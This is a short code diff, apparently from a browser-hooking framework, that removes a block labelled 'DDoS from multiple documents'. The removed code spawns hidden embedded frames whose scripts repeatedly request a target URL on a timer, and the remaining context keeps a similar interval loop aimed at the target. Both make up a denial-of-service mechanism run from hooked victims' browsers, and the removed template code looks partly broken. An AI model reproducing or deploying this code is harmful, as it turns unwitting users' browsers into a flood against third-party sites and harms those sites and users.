@@ -70,24 +70,6 @@ if (injectify.info.platform === 'browser') {
   if (request.url) {
     if (request.method === 'GET') {
       /**
-       * DDoS from multiple documents
-       */
-
-      injectify
-        .module('embed', {
-          interaction: false,
-          hidden: true
-        })
-        .then((element) => {
-          element.srcdoc = `<script>setInterval(function(){ let url=${JSON.stringify(
-            target
-          )}${request.random}`
-            ? '+"?"++new Date()'
-            : `; let req = new Image(); req.src=url; /* if (typeof window.fetch === "function") window.fetch(url); */ },${request.interval *
-                4})</script>`
-        })
-
-      /**
        * Request the target url
        */
       setInterval(() => {
